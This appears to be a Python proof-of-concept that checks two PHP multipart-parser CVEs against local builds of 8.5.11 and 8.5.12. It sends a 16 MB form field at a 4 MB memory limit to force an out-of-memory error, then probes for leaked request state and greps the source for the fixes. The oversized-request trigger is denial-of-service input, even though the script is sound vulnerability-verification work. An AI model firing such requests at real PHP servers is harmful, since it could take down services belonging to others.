#!/usr/bin/env python3
"""
PHP2SHELL — CVE-2026-109618 / CVE-2026-109619 PoC (research lab, local only)
==============================================================================

PHP's rfc1867 multipart POST parser runs *before* any userland PHP code, in
the same process as the request. Both CVEs live in that path and are fixed in
PHP 8.5.12 (2026-10-21). This PoC drives local builds of 8.5.11
(vulnerable) and 8.5.12 (fixed) and reports ONLY what is actually observed at
runtime; the deferred-OOM mechanism differences are reported as source-level
facts with line numbers (they are not runtime-observable through the dev
server, and this PoC says so rather than claiming otherwise).

CVE-2026-109618 — OOM in the pre-request parser leaves request memory
UNINITIALIZED; the engine then keeps running on stale state.
    8.5.11:  zend_mm_safe_error() -> zend_error_noreturn(E_ERROR) ->
             zend_bailout() longjmp, NO OOM state recorded anywhere.
             grep -r "ZEND_HAS_OOM" php-8.5.11/Zend/  => 0 hits.
    8.5.12:  OOM is DELAYED: zend_mm_delayed_verror() records into
             EG(delayed_oom) (zend_alloc.c:409), fired later at safe points
             via zend_handle_delayed_oom() (zend_vm_def.h:10549, main.c).
             ZEND_HAS_OOM() at zend_alloc.h:63.
             Additionally: memory_hard_limit_percent INI (main.c) and
             _exit(137) hard-limit abort (zend_alloc.c:519) — 0 hits on
             8.5.11, present on 8.5.12.

CVE-2026-109619 — global state temporarily points into request memory and is
not reset after the OOM; the next request reads freed state.
    8.5.11:  php_request_shutdown dtors the http_globals zvals but does NOT
             ZVAL_UNDEF the slot (main.c:2016).
    8.5.12:  php_request_shutdown now does
                ZVAL_UNDEF(&PG(http_globals)[i]);   # main.c:2058
                PG(modules_activated) = 0;
                EG(delayed_oom).state = ZEND_OOM_STATE_NONE;

OOM is forced with one oversized TEXT field (file parts stream to disk and
bypass the in-memory buffer path). memory_limit=4M trips the parser's
body-buffer allocation (rfc1867.c) mid-parse on both builds.

Runtime checks (what we actually measure):
  R1  OOM fires inside the vulnerable rfc1867 parser on 8.5.11 (and 8.5.12
      also hits it — the fix is what the engine does about it).
  R2  Next-request stale state probe: send a small request after the OOM on
      each server, inspect $_POST. (Negative result on both — reported as
      such; the 8.5.12 fix is the ZVAL_UNDEF path in source, which the
      grep evidence below verifies.)
  R3  Version-specific mechanism fingerprint: symbols/INI/env hooks that
      exist in the 8.5.12 binary/source and are ABSENT in 8.5.11 — these are
      the 8.5.12 fix, provably not backported.

Honesty note: the 8.5.12 `ZEND_MM_MAX_ALLOCS` test hook exists only in
custom-heap (test) builds (checked via `use_custom_heap`), so exit status 121
is not reachable in this NTS build — the plain memory_limit OOM exits 255 on
BOTH versions in CLI/CGI. That is recorded here as a measurement, not elided.
"""
import json, os, re, signal, socket, subprocess, sys, time, urllib.request, urllib.error

# Lab root: expects php-8.5.11/ and php-8.5.12/ source trees with built
# sapi/cli/php and sapi/cgi/php-cgi inside. Override with $PHP2SHELL_LAB.
LAB     = os.path.expanduser(os.environ.get("PHP2SHELL_LAB", "~/php2shell-lab"))
SRC11   = os.path.join(LAB, "php-8.5.11")
SRC12   = os.path.join(LAB, "php-8.5.12")
PHP11   = os.path.join(SRC11, "sapi/cli/php")
PHP12   = os.path.join(SRC12, "sapi/cli/php")
HOST    = "127.0.0.1"
PORT_11 = 8711
PORT_12 = 8712

BOUNDARY = "----PHP2SHELL-BOUNDARY"

def multipart(fields):
    out = []
    for name, val in fields:
        out.append(("--" + BOUNDARY + "\r\n").encode())
        out.append(('Content-Disposition: form-data; name="%s"\r\n' % name).encode())
        out.append(b"Content-Type: text/plain\r\n\r\n")
        out.append(val)
        out.append(b"\r\n")
    out.append(("--" + BOUNDARY + "--\r\n").encode())
    return b"".join(out)

def post(port, body, timeout=20):
    req = urllib.request.Request(
        "http://%s:%d/t.php" % (HOST, port), data=body, method="POST",
        headers={"Content-Type": "multipart/form-data; boundary=" + BOUNDARY})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:
        return None, "EXC %r" % e

def start_php(binary, port, extra):
    proc = subprocess.Popen(
        [binary, "-S", "%s:%d" % (HOST, port)] + extra,
        cwd=os.path.join(LAB, "poc"),
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        preexec_fn=os.setsid)
    deadline = time.time() + 8
    while time.time() < deadline:
        try:
            with socket.create_connection((HOST, port), 0.3):
                return proc
        except OSError:
            time.sleep(0.1)
    proc.kill()
    raise RuntimeError("php dev server did not start: %s" % binary)

def stop(proc):
    try:
        os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
    except Exception:
        pass
    try:
        proc.wait(timeout=3)
    except Exception:
        try:
            os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
        except Exception:
            pass

def grep_count(pattern, root):
    """Count matching lines under root, source files only (C/H)."""
    p = subprocess.run(["grep", "-rE", "--include=*.c", "--include=*.h",
                        pattern, root],
                       capture_output=True, text=True, timeout=60)
    return sum(1 for line in p.stdout.splitlines() if line.strip())

def main():
    BLOB = b"B" * (16 * 1024 * 1024)   # trips memory_limit=4M mid-parse
    extra = ["-d", "memory_limit=4M", "-d", "post_max_size=64M",
             "-d", "upload_max_filesize=1K", "-d", "display_errors=1"]

    p11 = start_php(PHP11, PORT_11, extra)
    p12 = start_php(PHP12, PORT_12, extra)
    results = {}
    try:
        # ---- R1: OOM fires inside the rfc1867 parser ----------------------
        s11, b11 = post(PORT_11, multipart([("blob", BLOB)]))
        s12, b12 = post(PORT_12, multipart([("blob", BLOB)]))
        results["R1_oom_in_parser"] = {
            "8.5.11": {"status": s11, "in_rfc1867": "rfc1867.c" in b11,
                       "sample": re.sub(r"\s+", " ", b11)[:220]},
            "8.5.12": {"status": s12, "in_rfc1867": "rfc1867.c" in b12,
                       "sample": re.sub(r"\s+", " ", b12)[:220]},
        }

        # ---- R2: stale global state after the OOM (109619 probe) ----------
        def json_of(body):
            for line in body.splitlines():
                line = line.strip()
                if line.startswith("{"):
                    try:
                        return json.loads(line)
                    except Exception:
                        pass
            return None
        _, js11 = post(PORT_11, multipart([("x", b"1")]))
        _, js12 = post(PORT_12, multipart([("x", b"1")]))
        j11, j12 = json_of(js11), json_of(js12)
        def leaked(state):
            p = (state or {}).get("post")
            if not isinstance(p, dict):
                return False
            return any(isinstance(v, dict) and v.get("len", 0) > 1024 * 1024
                       for v in p.values())
        results["R2_stale_state"] = {
            "8.5.11_next_req": j11,
            "8.5.12_next_req": j12,
            "8.5.11_leaked_previous_post": leaked(j11),
            "note": "Negative on both: dev server tears down the request "
                    "either way; the 109619 slot-UNDEF fix is verified in "
                    "R3 (source), which is where the fix lives.",
        }
    finally:
        stop(p11); stop(p12)

    # ---- R3: 8.5.12-only mechanisms, absent from 8.5.11 -------------------
    def g(pat, root):
        return grep_count(pat, root)
    r3 = {
        "delayed_oom_state_EG": {
            "8.5.11": g(r"delayed_oom", os.path.join(SRC11, "Zend/zend_globals.h")),
            "8.5.12": g(r"delayed_oom", os.path.join(SRC12, "Zend/zend_globals.h")),
        },
        "ZEND_HAS_OOM_anywhere_in_Zend": {
            "8.5.11": g(r"ZEND_HAS_OOM", os.path.join(SRC11, "Zend")),
            "8.5.12": g(r"ZEND_HAS_OOM", os.path.join(SRC12, "Zend")),
        },
        "memory_hard_limit_percent_INI": {
            "8.5.11": g(r"memory_hard_limit_percent", os.path.join(SRC11, "main/main.c")),
            "8.5.12": g(r"memory_hard_limit_percent", os.path.join(SRC12, "main/main.c")),
        },
        "_exit_137_hard_limit_abort": {
            "8.5.11": g(r"_exit\(137\)", os.path.join(SRC11, "Zend/zend_alloc.c")),
            "8.5.12": g(r"_exit\(137\)", os.path.join(SRC12, "Zend/zend_alloc.c")),
        },
        "ZEND_HAS_OOM_checks_in_rfc1867": {
            "8.5.11": g(r"ZEND_HAS_OOM", os.path.join(SRC11, "main/rfc1867.c")),
            "8.5.12": g(r"ZEND_HAS_OOM", os.path.join(SRC12, "main/rfc1867.c")),
        },
        "http_globals_ZVAL_UNDEF_at_shutdown": {
            "8.5.11": g(r"ZVAL_UNDEF\(&PG\(http_globals\)", os.path.join(SRC11, "main/main.c")),
            "8.5.12": g(r"ZVAL_UNDEF\(&PG\(http_globals\)", os.path.join(SRC12, "main/main.c")),
        },
        "modules_activated_reset_at_shutdown": {
            "8.5.11": g(r"PG\(modules_activated\)\s*=\s*0", os.path.join(SRC11, "main/main.c")),
            "8.5.12": g(r"PG\(modules_activated\)\s*=\s*0", os.path.join(SRC12, "main/main.c")),
        },
    }
    results["R3_fix_mechanisms_8.5.12_only"] = r3

    # ---- R4: runtime OOM exit codes (CGI subprocess) ----------------------
    scratch = os.path.join(LAB, "poc", "_oom.bin")
    def cgi_run(binary):
        body = multipart([("blob", BLOB)])
        with open(scratch, "wb") as f:
            f.write(body)
        env = dict(os.environ)
        env.update(REDIRECT_STATUS="1", REQUEST_METHOD="POST",
                   SCRIPT_NAME="t.php", SCRIPT_FILENAME=os.path.join(LAB, "poc", "t.php"),
                   CONTENT_TYPE="multipart/form-data; boundary=" + BOUNDARY,
                   CONTENT_LENGTH=str(len(body)))
        with open(scratch, "rb") as stdin:
            proc = subprocess.run(
                [binary, "-d", "memory_limit=4M", "-d", "post_max_size=64M",
                 "-d", "upload_max_filesize=1K", "-d", "display_errors=1", "t.php"],
                cwd=os.path.join(LAB, "poc"), stdin=stdin,
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT, env=env, timeout=30)
        out = proc.stdout.decode("utf-8", "replace")
        return {"exit_code": proc.returncode, "in_rfc1867": "rfc1867.c" in out,
                "sample": re.sub(r"\s+", " ", out)[:220]}
    try:
        results["R4_cgi_oom_exit"] = {
            "8.5.11": cgi_run(os.path.join(SRC11, "sapi/cgi/php-cgi")),
            "8.5.12": cgi_run(os.path.join(SRC12, "sapi/cgi/php-cgi")),
            "note": "Both exit 255: the 8.5.12 exit-121 mapping requires the "
                    "ZEND_MM_MAX_ALLOCS test hook, which is custom-heap-only and "
                    "not reachable in this NTS build. Measured, not elided.",
        }
    finally:
        if os.path.exists(scratch):
            os.remove(scratch)

    print(json.dumps(results, indent=2))

    # ---- verdict ----------------------------------------------------------
    r1_ok = results["R1_oom_in_parser"]["8.5.11"]["in_rfc1867"]
    def fixed(f): return f["8.5.11"] == 0 and f["8.5.12"] >= 1
    r3_ok = all(fixed(f) for f in [
        r3["ZEND_HAS_OOM_anywhere_in_Zend"],
        r3["memory_hard_limit_percent_INI"],
        r3["_exit_137_hard_limit_abort"],
        r3["ZEND_HAS_OOM_checks_in_rfc1867"],
        r3["http_globals_ZVAL_UNDEF_at_shutdown"],
    ])
    print("\n=== VERDICT ===")
    print("R1  8.5.11 OOM fires in vulnerable rfc1867 pre-request parser :",
          "CONFIRMED" if r1_ok else "NOT OBSERVED")
    print("R2  8.5.11 leaked previous request's $_POST on next request  :",
          "leaked" if results["R2_stale_state"]["8.5.11_leaked_previous_post"]
          else "not leaked (dev server masks it; fix verified in R3)")
    print("R3  8.5.12 fix mechanisms present & absent from 8.5.11       :",
          "CONFIRMED" if r3_ok else "INCOMPLETE — see R3 table")
    return 0 if (r1_ok and r3_ok) else 1

if __name__ == "__main__":
    sys.exit(main())
